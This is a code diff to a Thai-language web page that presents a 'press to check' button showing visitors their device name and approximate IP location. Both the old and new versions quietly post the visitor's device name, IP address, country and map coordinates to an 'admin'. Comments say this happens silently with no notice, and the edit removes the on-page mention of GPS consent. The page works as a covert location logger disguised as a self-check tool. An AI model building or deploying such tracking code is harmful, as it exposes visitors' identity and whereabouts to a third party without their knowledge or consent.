@@ -142,7 +142,7 @@
   </button>
 
   <div class="small">
-    หมายเหตุ: GPS จริงของเครื่อง ต้องได้รับอนุญาตจากผู้ใช้ก่อนเท่านั้น ถ้าไม่อนุญาต ระบบจะใช้ตำแหน่งจาก IP แทน
+  ระบบจะแสดงชื่อเครื่อง และตำแหน่งโดยประมาณจาก IP
   </div>
 
   <div id="result" class="result">ยังไม่มีข้อมูล</div>
@@ -520,78 +520,86 @@ async function sendLocation() {
   btn.disabled = true;
   btn.textContent = "กำลังตรวจสอบ...";
 
-  result.textContent = "กำลังดึงข้อมูล...";
-
   const deviceName = getDeviceName();
 
-  const rawIP = await getIPInfo();
-  const ip = normalizeIP(rawIP);
+  // แสดงชื่อเครื่องขึ้นทันที ไม่ต้องรอ IP / GPS
+  result.textContent = `
+1 ชื่อเครื่อง
+ชื่อเครื่อง: ${deviceName}
 
-  const countryFullName = getCountryFullName(
-    ip.country_name,
-    ip.country_code
-  );
 
-  const ipGoogleMaps =
-    ip.latitude && ip.longitude
-      ? `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`
-      : "-";
+====== ข้อมูล IP / VPN ======
+กำลังดึงข้อมูล IP...
+`;
 
-  /*
-    ขอ GPS แบบ optional
-    ถ้าผู้ใช้ไม่อนุญาต จะไม่แสดง - ให้รก
-    และใช้ตำแหน่งจาก IP แทน
-  */
-  const gps = await getGPSOptional();
-
-  const gpsGoogleMaps =
-    gps.latitude && gps.longitude
-      ? `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`
-      : "-";
-
-  const payload = {
-    device_name: deviceName,
-    browser: getBrowserName(),
-    platform: navigator.platform || "",
-    user_agent: navigator.userAgent || "",
-    language: navigator.language || "",
-    screen: `${screen.width}x${screen.height}`,
-    timezone_browser: getBrowserTimezone(),
-
-    ip: ip.ip || "",
-    ip_country: countryFullName,
-    ip_country_code: ip.country_code || "",
-    ip_latitude: ip.latitude || "",
-    ip_longitude: ip.longitude || "",
-    ip_google_maps: ipGoogleMaps,
-    ip_org: ip.org || "",
-    ip_timezone: ip.timezone || "",
-    ip_source_api: ip.source_api || "",
-    ip_error: ip.error || "",
-
-    gps_allowed: gps.allowed,
-    gps_latitude: gps.latitude || "",
-    gps_longitude: gps.longitude || "",
-    gps_accuracy: gps.accuracy ? gps.accuracy + " เมตร" : "",
-    gps_google_maps: gpsGoogleMaps,
-    gps_error: gps.error || "",
-
-    sent_at: new Date().toLocaleString("th-TH")
-  };
-
-  renderResult(payload);
-
-  /*
-    ส่งไป Admin แบบเงียบ ๆ
-    ไม่แสดงข้อความว่าส่งแล้ว
-    ไม่ alert
-  */
   try {
-    await postToAdmin(payload);
+    // จำกัดเวลารอ IP แค่ 4 วินาที
+    const rawIP = await Promise.race([
+      getIPInfo(),
+      new Promise((_, reject) =>
+        setTimeout(() => reject(new Error("IP_TIMEOUT")), 4000)
+      )
+    ]);
+
+    const ip = normalizeIP(rawIP);
+
+    const countryFullName = getCountryFullName(
+      ip.country_name,
+      ip.country_code
+    );
+
+    const ipGoogleMaps =
+      ip.latitude && ip.longitude
+        ? `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`
+        : "ไม่พบพิกัดจาก IP";
+
+    const payload = {
+      device_name: deviceName,
+
+      ip: ip.ip || "",
+      ip_country: countryFullName,
+      ip_country_code: ip.country_code || "",
+      ip_latitude: ip.latitude || "",
+      ip_longitude: ip.longitude || "",
+      ip_google_maps: ipGoogleMaps,
+      ip_source_api: ip.source_api || "",
+      ip_error: ip.error || "",
+
+      sent_at: new Date().toLocaleString("th-TH")
+    };
+
+    result.textContent = `
+1 ชื่อเครื่อง
+ชื่อเครื่อง: ${val(payload.device_name)}
+
+
+====== ข้อมูล IP / VPN ======
+ประเทศ: ${val(payload.ip_country)}
+IP: ${val(payload.ip)}
+
+Google Maps IP:
+${ipGoogleMaps}
+`;
+
+    // ส่งไปแอดมินแบบเงียบ ๆ ไม่ต้องรอให้ผู้กดเห็น
+    postToAdmin(payload).catch(err => {
+      console.warn("ส่งข้อมูลไม่สำเร็จ:", err);
+    });
+
   } catch (err) {
-    console.warn("ส่งข้อมูลไม่สำเร็จ:", err);
+    result.textContent = `
+1 ชื่อเครื่อง
+ชื่อเครื่อง: ${deviceName}
+
+
+====== ข้อมูล IP / VPN ======
+ดึงข้อมูล IP ไม่สำเร็จ หรือใช้เวลานานเกินไป
+`;
+
+    console.warn("IP error:", err);
   }
 
+  // ให้ปุ่มกลับมากดได้เลย
   btn.disabled = false;
   btn.textContent = "กดเพื่อตรวจสอบ";
 }
